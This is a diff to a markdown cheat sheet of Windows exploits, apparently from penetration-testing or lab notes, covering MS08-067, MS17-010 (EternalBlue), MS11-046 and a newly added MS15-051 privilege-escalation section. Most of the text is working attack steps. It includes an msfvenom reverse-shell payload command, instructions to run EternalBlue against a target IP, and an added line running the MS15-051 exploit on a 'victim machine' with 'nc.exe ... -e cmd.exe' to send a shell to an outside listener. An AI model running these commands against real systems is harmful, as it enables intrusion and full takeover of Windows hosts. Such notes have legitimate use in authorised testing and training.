@@ -51,7 +51,7 @@ git clone https://github.com/andyacer/ms08_067.git
 * Choose the right option of menu.
   * Find OS of machine
   * Guess lanhuage
-* Needs listener
+* Needs Listener
 
 ### Windows
 #### MS17-010
@@ -68,13 +68,13 @@ git clone https://github.com/worawit/MS17-010.git
 * custom payload:
   * msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe
 
-* Need listener
+* Needs Listener
 
 ##### eternalblue_exploit7.py
 
 * use the https://github.com/nickvourd/eternalblue_win7_auto_gen in order to merge binaries nad payload
 * Run the following: python MS17-010/eternalblue_exploit7.py <ip> /tmp/sc_x<arch>.bin
-* Need listener
+* Needs Listener
 
 ### Windows
 #### MS11-046
@@ -83,6 +83,16 @@ git clone https://github.com/worawit/MS17-010.git
 * compile:
   * i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 (apt install mingw-w64)
 * no need listener (insta run)
+
+### Windows
+#### MS15-051
+
+* use the https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
+* Check the architecture of victim and choose the right exe
+* upload to victim machine
+* run the following:
+  * ms15-051x64.exe "nc.exe 10.10.14.28 4444 -e cmd.exe"
+* Needs Listener
 
 
 ## Privilege Escalation
